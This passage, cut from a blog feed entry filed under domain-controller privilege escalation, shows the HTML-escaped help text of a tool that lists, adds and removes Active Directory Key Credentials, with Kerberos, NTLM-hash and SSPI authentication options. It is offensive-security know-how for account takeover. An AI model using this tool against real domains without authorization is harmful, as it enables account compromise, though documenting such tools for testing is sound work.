function&#34;&gt;ip&lt;/span&gt; address&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-target-ip &lt;span class=&#34;token function&#34;&gt;ip&lt;/span&gt; address&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-target dns/ip address&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-ns nameserver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-dns-tcp&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-timeout seconds&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-u username@domain&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                      &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-p password&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-hashes &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;LMHASH:&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;NTHASH&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-k&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-sspi&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-aes hex key&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-no-pass&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;list,add,remove,clear,info,auto&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;positional arguments:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;list,add,remove,clear,info,auto&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        Key Credentials action&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;optional arguments:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  -h, &lt;span class=&#34;token parameter variable&#34;&gt;--help&lt;/span&gt;            show this &lt;span class=&#34;token builtin class-name&#34;&gt;help&lt;/span&gt; message and &lt;span class=&#34;token builtin class-name&#34;&gt;exit&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-account&lt;/span&gt; target account&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        Account to target. If omitted, the user specified &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; the target will be used&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  -device-id DEVICE_ID  Device ID of the Key Credential Link&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-debug&lt;/span&gt;                Turn debug output on&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;output options:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-out&lt;/span&gt; output &lt;span class=&#34;token function&#34;&gt;file&lt;/span&gt; name&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;connection options:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-scheme&lt;/span&gt; ldap scheme&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  -dc-ip &lt;span class=&#34;token function&#34;&gt;ip&lt;/span&gt; address     IP Address of the domain controller. If omitted it will use the domain part &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;FQDN&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; specified &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; the target parameter&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  -target-ip &lt;span class=&#34;token function&#34;&gt;ip&lt;/span&gt; address&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-target&lt;/span&gt; dns/ip address&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        DNS Name or IP Address of the target machine. Required &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; Kerberos or SSPI authentication&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-ns&lt;/span&gt; nameserver        Nameserver &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; DNS resolution&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  -dns-tcp              Use TCP instead of UDP &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; DNS queries&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-timeout&lt;/span&gt; seconds      Timeout &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; connections&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;authentication options:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; username@domain, &lt;span class=&#34;token parameter variable&#34;&gt;-username&lt;/span&gt; username@domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        Username. Format: username@domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; password, &lt;span class=&#34;token parameter variable&#34;&gt;-password&lt;/span&gt; password&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        Password&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-hashes&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;LMHASH:&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;NTHASH&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        NTLM hash, &lt;span class=&#34;token function&#34;&gt;format&lt;/span&gt; is &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;LMHASH:&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;NTHASH&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-k&lt;/span&gt;                    Use Kerberos authentication. Grabs credentials from ccache &lt;span class=&#34;token function&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;KRB5CCNAME&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; based on target parameters. If valid credentials cannot be found, it will use the ones specified &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; the &lt;span class=&#34;token builtin class-name&#34;&gt;command&lt;/span&gt; line&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-sspi&lt;/span&gt;                 Use Windows Integrated Authentication &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SSPI&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token parameter variable&#34;&gt;-aes&lt;/span&gt; hex key          AES key to use &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; Kerberos Authentication &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt; or &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt; bits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  -no-pass              Don&#39;t ask &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; password &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;useful &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-k&lt;/span&gt; and -sspi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <category term="域控提权" />
        <updated>2024-01-23T17:20:34.000Z</updated>
    </entry>
</feed>
